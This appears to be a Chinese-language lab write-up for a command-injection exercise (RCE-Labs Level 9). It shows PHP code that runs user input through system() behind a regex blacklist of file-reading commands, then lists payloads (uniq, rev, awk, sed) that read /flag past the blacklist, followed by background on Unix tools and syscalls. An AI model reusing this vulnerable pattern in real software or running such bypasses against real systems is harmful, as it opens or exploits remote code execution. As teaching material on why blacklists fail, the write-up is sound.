一、题目信息

  • 题目名称：RCE-Labs Level 9 (uniq 命令去重)
  • 靶场链接：http://靶机IP:8080/less-9/
  • 涉及工具：浏览器

二、解题步骤

1. 分析题目考什么

黑名单再次累加，变成了 /cat|tac|head|tail|more|less|nl|sort/，几乎封杀了所有常见的文本查看工具。题目提示使用 uniq 命令。

2. 怎么解

源码核心逻辑

$pattern = '/cat|tac|head|tail|more|less|nl|sort/';
if(!preg_match($pattern,$cmd)){
    system($cmd);
}

最终成功 Payload

?cmd=uniq /flag

备用方案：

?cmd=rev /flag
?cmd=awk '{print}' /flag
?cmd=sed -n '1,10p' /flag

三、深度复盘：命令的本质与底层逻辑

1. 这些命令产生的原因是什么？（历史与需求演变）

它们都诞生于 20 世纪 70 年代的 Unix 时代，核心遵循 **Unix 哲学**：“一切皆文件”和“一个程序只做一件事，并做到极致”。

  • 早期计算机内存极其昂贵（KB级别），无法将几十MB的日志文件一次性加载到内存。因此诞生了按需读取的 head、tail，以及分页查看的 more、less。
  • 系统管理员在处理海量日志、文本数据时，需要快速排序（sort）、去重（uniq）、提取行号（nl）、搜索内容（grep）、替换文本（sed）。这些工具最初是独立的纯C程序，通过**管道（Pipe）**互相配合，完成极其复杂的任务。
  • 因为“读文件”这个动作被拆分成了几十种不同维度的细分工具，这就导致了黑名单机制天然防不住它们——你封杀了一个名字，还有其他几十个名字能读同一个文件。

2. 对应计算机哪些底层逻辑？（系统调用与IO流）

在操作系统层面，无论命令叫什么名字，它们底层干的活都是一样的：

  • 文件打开与描述符：所有命令最终都会调用 Linux 的 open() 系统调用打开 /flag 文件，获取一个文件描述符（File Descriptor）。
  • 读取与系统调用：cat、tac、uniq、sort 核心都是调用 read() 函数，从磁盘读取数据到内存缓冲区。
  • 定位与指针偏移（关键区别）：cat 是顺序读取。tail 的底层依赖于 lseek() 系统调用，它把文件指针直接偏移到文件末尾，从后往前读取，这是它效率极高的原因。
  • 排序与去重算法：sort 在内存（或磁盘临时文件）中对读取到的行进行归并排序或快速排序。uniq 底层利用哈希表或逐行比较，消除相邻的重复行。
  • 标准输出（stdout）：处理完数据后，调用 write() 系统调用，将结果写入标准输出。在 Web RCE 中，这个 stdout 被 PHP 的 system() 捕获，最后展示在你的浏览器上。

3. 这些命令是否有其他应用？（运维与数据处理场景）

  • uniq：常用于日志分析。比如 sort access.log | uniq -c 可以统计每个 IP 的访问次数（去重并计数）。
  • sort：数据库或表格处理。比如对结果集按第二列数字大小排序 sort -k2 -n。
  • tail -f：这是运维人员最常用的命令，用于实时监控服务器日志，当有新日志产生时，屏幕会自动滚动输出。
  • nl：阅读代码或需要打印行号的文本时使用。
  • sed 与 awk：这两者甚至是图灵完备的编程语言，常用于日志格式化、批量修改配置文件（比如 sed -i 's/8080/80/g' config.conf）。
  • grep：在服务器上排查故障时，结合管道快速过滤出错误信息，例如 ps aux | grep nginx。
